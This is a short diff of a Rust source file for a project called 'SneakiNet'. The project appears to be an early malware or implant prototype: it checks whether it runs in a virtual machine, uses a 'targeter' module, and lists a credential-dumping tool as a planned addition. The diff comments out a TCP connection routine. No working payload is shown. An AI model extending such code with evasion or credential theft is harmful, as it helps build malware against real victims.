@@ -1,6 +1,6 @@
 use vm_detector::CheckVM;
 use targeter::targeter;
-use std::{net::TcpStream, io::{Read,Write}};
+//use std::{net::TcpStream, io::{Read,Write}};
 
 
 /// Eventually we wanna implement these things:
@@ -16,13 +16,15 @@ use std::{net::TcpStream, io::{Read,Write}};
 ///     Potentially smaller footprint --> https://github.com/returnvar/wce
 /// 
 
-struct SneakiNet{
-    id: u32, 
-}
+struct SneakiNet{}
 
 
 impl SneakiNet {
-    fn initialize(&mut self, target: &str){
+    pub fn new() -> Self {
+        SneakiNet{}
+    }
+
+    /*(fn initialize(&mut self, target: &str){
         // attept to connect to the target 
         match TcpStream::connect(target) {
             Ok(mut stream) => {
@@ -52,7 +54,7 @@ impl SneakiNet {
             } 
         }
         println!("[INFO] Terminated");
-    }
+    }*/
 
     fn check_vm(&mut self) -> bool {
         let mut cvm = CheckVM{};
@@ -77,8 +79,7 @@ impl SneakiNet {
 
 
 fn main() {
-    let id = 1;
-    let mut t = SneakiNet{ id };
+    let mut t = SneakiNet::new();
     let mut tgtr = targeter::Targeter::new(); 
 
     // check if we are in a VM
